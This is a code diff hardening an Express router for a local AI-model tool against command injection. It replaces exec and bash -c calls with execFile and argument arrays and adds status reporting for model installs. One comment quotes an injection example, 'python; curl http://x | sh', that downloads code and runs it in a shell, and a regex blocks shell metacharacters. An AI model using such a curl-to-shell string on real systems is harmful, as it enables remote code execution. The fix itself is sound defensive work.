@@ -5,7 +5,7 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
-const { exec, spawn, execSync } = require('child_process');
+const { spawn, execFile, execFileSync } = require('child_process');
 const EventEmitter = require('events');
 const os = require('os');
 
@@ -88,9 +88,13 @@ module.exports = function createCookbookRouter(deps) {
 
   // ── GPU Probing ─────────────────────────────────────────────────
 
-  function runCmd(cmd, timeout = 10000) {
+  // execFile, not exec: no shell is involved, so nothing here can ever be
+  // reinterpreted as a command. Callers pass an executable and an argument
+  // array. These probes are fixed literals today; the shape guarantees they
+  // stay safe if a caller ever becomes dynamic.
+  function runCmd(file, args = [], timeout = 10000) {
     return new Promise((resolve) => {
-      exec(cmd, { timeout, windowsHide: true }, (err, stdout, stderr) => {
+      execFile(file, args, { timeout, windowsHide: true }, (err, stdout, stderr) => {
         resolve({ ok: !err, stdout: (stdout || '').trim(), stderr: (stderr || '').trim(), code: err ? err.code : 0 });
       });
     });
@@ -98,8 +102,7 @@ module.exports = function createCookbookRouter(deps) {
 
   // NVIDIA GPU probe via nvidia-smi
   async function probeNvidiaGpus() {
-    const query = 'nvidia-smi --query-gpu=index,name,memory.free,memory.total,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits';
-    const result = await runCmd(query);
+    const result = await runCmd('nvidia-smi', ['--query-gpu=index,name,memory.free,memory.total,memory.used,utilization.gpu,uuid', '--format=csv,noheader,nounits']);
     if (!result.ok || !result.stdout) return { gpus: [], error: result.stderr || 'nvidia-smi not found' };
 
     const gpus = [];
@@ -123,8 +126,7 @@ module.exports = function createCookbookRouter(deps) {
 
     // Best-effort process listing
     if (gpus.length) {
-      const procQuery = 'nvidia-smi --query-compute-apps=pid,gpu_uuid,process_name,used_memory --format=csv,noheader,nounits';
-      const procResult = await runCmd(procQuery, 5000);
+      const procResult = await runCmd('nvidia-smi', ['--query-compute-apps=pid,gpu_uuid,process_name,used_memory', '--format=csv,noheader,nounits'], 5000);
       if (procResult.ok && procResult.stdout) {
         const uuidToIdx = {};
         gpus.forEach(g => { uuidToIdx[g.uuid] = g.index; });
@@ -187,7 +189,7 @@ module.exports = function createCookbookRouter(deps) {
     const { pid } = req.body;
     if (!pid || pid < 100) return res.status(400).json({ ok: false, error: 'Invalid PID' });
     try {
-      execSync(`taskkill /F /T /PID ${parseInt(pid)}`, { stdio: 'ignore', windowsHide: true });
+      execFileSync('taskkill', ['/F', '/T', '/PID', String(parseInt(pid))], { stdio: 'ignore', windowsHide: true });
       res.json({ ok: true, pid });
     } catch (e) {
       res.json({ ok: false, error: e.message });
@@ -387,13 +389,36 @@ module.exports = function createCookbookRouter(deps) {
 
     let cmd, args;
     // Use `hf` CLI if available, else Python huggingface_hub
+    // This route needs the Hugging Face CLI or a real Python. AEON installs
+    // neither. It used to fall through to a bare 'python', which on stock
+    // Windows resolves to the Microsoft Store alias stub — a real file, so
+    // spawn succeeds, then it prints a Store advert and exits non-zero. No
+    // diagnostic pattern matched that, so the user saw an unexplained failure.
+    //
+    // Say what is missing, and point at the installer that needs nothing.
     const hfCli = findExecutable('hf');
     if (hfCli) {
       cmd = hfCli;
       args = ['download', repo_id];
       if (include) { args.push('--include', include); }
     } else {
-      cmd = findExecutable('python') || findExecutable('python3') || 'python';
+      const py = findExecutable('python') || findExecutable('python3');
+      const isStoreStub = py && /WindowsApps/i.test(py);
+      if (!py || isStoreStub) {
+        return res.status(503).json({
+          ok: false,
+          error: isStoreStub
+            ? 'Python resolves to the Microsoft Store placeholder, not a real interpreter.'
+            : 'Neither the Hugging Face CLI ("hf") nor Python was found on PATH.',
+          hint: 'Hugging Face downloads need one of those installed. To install a model with no extra tools, use Local models above — AEON downloads and verifies those itself.',
+        });
+      }
+      // allow_patterns is interpolated into a Python literal; keep it to a
+      // conservative character set so it cannot terminate the string.
+      if (include && !/^[A-Za-z0-9._*\/-]{1,120}$/.test(include)) {
+        return res.status(400).json({ ok: false, error: 'include contains unsupported characters.' });
+      }
+      cmd = py;
       const pyScript = `from huggingface_hub import snapshot_download; snapshot_download('${repo_id}'${include ? `, allow_patterns=['${include}']` : ''})`;
       args = ['-c', pyScript];
     }
@@ -492,47 +517,67 @@ module.exports = function createCookbookRouter(deps) {
     if (!repo_id) return res.status(400).json({ ok: false, error: 'repo_id is required' });
     if (!serveCmd) return res.status(400).json({ ok: false, error: 'cmd is required' });
 
-    // Validate cmd starts with an allowed binary
+    // This check used to read the FIRST TOKEN only and then hand the entire
+    // original string to `bash -c` (or spawn with shell:true). "python; curl
+    // http://x | sh" passed the allowlist and ran both halves — an allowlist a
+    // reviewer would find and trust, guarding nothing. Worse than an obviously
+    // raw endpoint, because it looks validated.
+    //
+    // Now: the command is TOKENISED, the executable is checked, and the argument
+    // vector is passed as an array with no shell anywhere. Shell metacharacters
+    // are rejected outright rather than escaped, because nothing legitimate in a
+    // model-serve command needs them.
     const ALLOWED = new Set(['vllm', 'llama-server', 'llama_server', 'python', 'python3', 'sglang', 'node', 'npx']);
-    const cleaned = serveCmd.replace(/\\\n/g, ' ').trim();
-    if (/[`\n\r]/.test(cleaned)) {
-      return res.status(400).json({ ok: false, error: 'Invalid characters in cmd' });
+    const cleaned = String(serveCmd).replace(/\\\n/g, ' ').trim();
+    if (/[`\n\r;&|<>$(){}]/.test(cleaned)) {
+      return res.status(400).json({
+        ok: false,
+        error: 'cmd may not contain shell metacharacters. Pass the executable and its flags only.',
+      });
     }
-    const tokens = cleaned.split(/\s+/).filter(t => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(t));
-    const firstBin = path.basename(tokens[0] || '');
+
+    const rawTokens = cleaned.split(/\s+/).filter(Boolean);
+    // Leading VAR=value assignments are configuration, not part of the command.
+    const envAssignments = {};
+    let i = 0;
+    for (; i < rawTokens.length; i++) {
+      const m = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(rawTokens[i]);
+      if (!m) break;
+      envAssignments[m[1]] = m[2];
+    }
+    const argvTokens = rawTokens.slice(i);
+    const execFileName = argvTokens[0] || '';
+    const firstBin = path.basename(execFileName);
     if (!ALLOWED.has(firstBin)) {
       return res.status(400).json({ ok: false, error: `cmd binary '${firstBin}' not allowed` });
     }
+    const serveArgs = argvTokens.slice(1);
 
     const sessionId = `serve-${crypto.randomBytes(4).toString('hex')}`;
     const logFile = path.join(LOGS_DIR, `${sessionId}.log`);
     const pidFile = path.join(LOGS_DIR, `${sessionId}.pid`);
 
-    const env = { ...process.env, PYTHONUTF8: '1', PYTHONIOENCODING: 'utf-8' };
+    const env = { ...process.env, PYTHONUTF8: '1', PYTHONIOENCODING: 'utf-8', ...envAssignments };
     if (hf_token) env.HF_TOKEN = hf_token;
     if (gpus) env.CUDA_VISIBLE_DEVICES = gpus;
 
-    // Find bash (Git Bash on Windows)
-    const bash = findBash();
-
     try {
       const logStream = fs.createWriteStream(logFile, { flags: 'a' });
-      let proc;
+      // No bash, no shell:true. Fixed executable, argument array.
+      const proc = spawn(execFileName, serveArgs, {
+        env, stdio: ['ignore', 'pipe', 'pipe'],
+        windowsHide: true, detached: true, shell: false,
+      });
 
-      if (bash) {
-        // Run through bash for full command compatibility
-        proc = spawn(bash, ['-c', cleaned], {
-          env, stdio: ['ignore', 'pipe', 'pipe'],
-          windowsHide: true, detached: true,
-        });
-      } else {
-        // Direct spawn — works for simple commands
-        const parts = cleaned.split(/\s+/);
-        proc = spawn(parts[0], parts.slice(1), {
-          env, stdio: ['ignore', 'pipe', 'pipe'],
-          windowsHide: true, detached: true, shell: true,
-        });
-      }
+      proc.on('error', (err) => {
+        const detail = err.code === 'ENOENT'
+          ? `Could not start "${execFileName}" — not found on PATH.`
+          : `Could not start "${execFileName}": ${err.message}`;
+        console.error(`[COOKBOOK] serve spawn failed (${sessionId}): ${detail}`);
+        try { logStream.write(`\n=== Failed to start process ===\n${detail}\n`); logStream.end(); } catch {}
+        const t = activeTasks[sessionId];
+        if (t) { t.status = 'error'; t.error = detail; }
+      });
 
       proc.unref();
       fs.writeFileSync(pidFile, String(proc.pid), 'utf8');
@@ -688,7 +733,7 @@ module.exports = function createCookbookRouter(deps) {
 
     if (task.pid) {
       try {
-        execSync(`taskkill /F /T /PID ${task.pid}`, { stdio: 'ignore', windowsHide: true });
+        execFileSync('taskkill', ['/F', '/T', '/PID', String(parseInt(task.pid))], { stdio: 'ignore', windowsHide: true });
       } catch {}
     }
     task.status = 'stopped';
@@ -903,22 +948,16 @@ module.exports = function createCookbookRouter(deps) {
 
   function findExecutable(name) {
     try {
-      const result = execSync(`where ${name}`, { timeout: 3000, windowsHide: true, encoding: 'utf8' });
+      const result = execFileSync('where', [name], { timeout: 3000, windowsHide: true, encoding: 'utf8' });
       const first = result.split('\n')[0].trim();
       return first || null;
     } catch { return null; }
   }
 
-  function findBash() {
-    const candidates = [
-      'C:\\Program Files\\Git\\bin\\bash.exe', // aeon-path-authority-allow
-      'C:\\Program Files (x86)\\Git\\bin\\bash.exe', // aeon-path-authority-allow
-    ];
-    for (const c of candidates) {
-      if (fs.existsSync(c)) return c;
-    }
-    return findExecutable('bash');
-  }
+  // findBash() was removed with the last `bash -c` call site. It hardcoded two
+  // Git-for-Windows install paths and existed only to give /model/serve "full
+  // command compatibility" — i.e. a shell, which was the vulnerability. Nothing
+  // in AEON needs bash.
 
   // ── Phase 8: runtime installer (llama.cpp binary) ────────────────────────
   const runtimeInstaller = (() => {
@@ -1013,6 +1052,15 @@ module.exports = function createCookbookRouter(deps) {
       const logFile = path.join(LOGS_DIR, `${sessionId}.log`);
       const logStream = fs.createWriteStream(logFile, { flags: 'a' });
 
+      // Register as a task. Previously the model installer wrote only to a log
+      // file: /cookbook/local/status filters on type === 'runtime-install', so a
+      // MODEL install's progress and failures never reached any status route.
+      // The console line existed; nothing the UI polls could see it.
+      activeTasks[sessionId] = {
+        type: 'model-install', status: 'running', query: modelId,
+        started_at: Date.now(), logFile, pct: 0, log: null, error: null,
+      };
+
       res.json({ ok: true, session_id: sessionId });
 
       modelInstaller.installModel({
@@ -1020,15 +1068,23 @@ module.exports = function createCookbookRouter(deps) {
         modelId,
         onStatus: (msg) => {
           logStream.write(`[STATUS] ${msg}\n`);
+          const t = activeTasks[sessionId];
+          if (t) t.log = msg;
           if (typeof global.broadcastTerminalEvent === 'function') {
             global.broadcastTerminalEvent('LOCAL_MODEL_INSTALL', `[${modelId}] ${msg}`);
           }
         },
-        onProgress: (pct) => logStream.write(`[PROGRESS] ${pct}%\n`),
+        onProgress: (pct) => {
+          logStream.write(`[PROGRESS] ${pct}%\n`);
+          const t = activeTasks[sessionId];
+          if (t) t.pct = pct;
+        },
       }).then(() => {
         console.log(`[LOCAL MODEL] Install complete: ${modelId}`);
         logStream.write('LOCAL_MODEL_INSTALL_OK\n');
         logStream.end();
+        const t = activeTasks[sessionId];
+        if (t) { t.status = 'done'; t.pct = 100; }
       }).catch(e => {
         // R-05: the outcome only ever reached a per-session log file on disk.
         // Nothing on the console, nothing in any status route — a failed model
@@ -1036,6 +1092,8 @@ module.exports = function createCookbookRouter(deps) {
         console.error(`[LOCAL MODEL] Install FAILED (${modelId}): ${e.message}`);
         logStream.write(`ERROR: ${e.message}\nLOCAL_MODEL_INSTALL_FAILED\n`);
         logStream.end();
+        const t = activeTasks[sessionId];
+        if (t) { t.status = 'error'; t.error = e.message; }
       });
     });
 
@@ -1070,15 +1128,28 @@ module.exports = function createCookbookRouter(deps) {
         // Surface the most recent runtime-install outcome. Without this a failed
         // install is invisible to the UI: the panel just keeps saying "not
         // installed" with no reason, which reads as the button doing nothing.
-        let install = null;
-        const runs = Object.entries(activeTasks)
-          .filter(([, t]) => t && t.type === 'runtime-install')
-          .sort((a, b) => (b[1].started_at || 0) - (a[1].started_at || 0));
-        if (runs.length) {
+        const latest = (type) => {
+          const runs = Object.entries(activeTasks)
+            .filter(([, t]) => t && t.type === type)
+            .sort((a, b) => (b[1].started_at || 0) - (a[1].started_at || 0));
+          if (!runs.length) return null;
           const t = runs[0][1];
-          install = { status: t.status, pct: t.pct || 0, log: t.log || null, error: t.error || null };
-        }
-        res.json({ ok: true, runtimeReady: !!active, activeRuntime: active ? active.id : null, readyModels: ready.length, install, models: ready.map(m => ({ id: m.id, displayName: m.displayName, capabilities: m.capabilities })) });
+          return { status: t.status, pct: t.pct || 0, log: t.log || null, error: t.error || null, target: t.query || null };
+        };
+        const install = latest('runtime-install');
+        // Model installs are reported too. Only the runtime's outcome used to
+        // reach this route, so a failed MODEL install showed as "not installed"
+        // with no reason — indistinguishable from never pressing the button.
+        const modelInstall = latest('model-install');
+        res.json({
+          ok: true,
+          runtimeReady: !!active,
+          activeRuntime: active ? active.id : null,
+          readyModels: ready.length,
+          install,
+          modelInstall,
+          models: ready.map(m => ({ id: m.id, displayName: m.displayName, capabilities: m.capabilities })),
+        });
       } catch (e) {
         res.status(500).json({ ok: false, error: e.message });
       }
